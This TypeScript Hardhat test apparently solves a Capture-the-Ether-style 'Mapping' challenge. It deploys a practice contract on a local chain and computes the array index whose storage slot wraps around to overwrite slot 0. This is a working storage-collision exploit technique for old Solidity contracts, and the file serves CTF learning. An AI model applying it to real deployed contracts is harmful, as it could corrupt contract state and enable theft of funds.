import { SignerWithAddress as HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { expect } from "chai";
import hre from "hardhat";

import { MappingChallenge, MappingChallenge__factory } from "../typechain-types";

describe("12. Math -> Mapping", function () {
  let owner: HardhatEthersSigner;
  let player: HardhatEthersSigner;
  let level: MappingChallenge;

  beforeEach(async function () {
    [owner, player] = await hre.ethers.getSigners();
    player;

    const factory: MappingChallenge__factory = new MappingChallenge__factory(owner);
    level = await factory.deploy();
    await level.waitForDeployment();
  });

  it("should be completed", async function () {
    const ARRAY_VARIABLE_SLOT = 1;

    const tx = await level.set(hre.ethers.MaxUint256 - 1n, 0);
    await expect(tx).to.be.not.reverted;
    await tx.wait();

    // dynamic array elements are located in storage starting from slot keccack256(p),
    // where p is slot in which array variable defined, #1 in this case
    // we need to calculate array length to make its last element overlap slot #0
    const totalSlots = hre.ethers.MaxUint256 + 1n;
    const arrayDataFirstSlot = BigInt(hre.ethers.keccak256(hre.ethers.toBeHex(ARRAY_VARIABLE_SLOT, 32)));
    const numberOfElementsTillStorageEnd = totalSlots - arrayDataFirstSlot;
    const numberOfElementsToOverwriteSlot0 = numberOfElementsTillStorageEnd + 1n;
    const indexOfArrayLastElement = numberOfElementsToOverwriteSlot0 - 1n; // because indexes are 0-based

    const tx1 = await level.set(indexOfArrayLastElement, 1);
    await expect(tx1).to.be.not.reverted;
    await tx1.wait();

    expect(await level.isComplete()).to.be.true;
  });
});
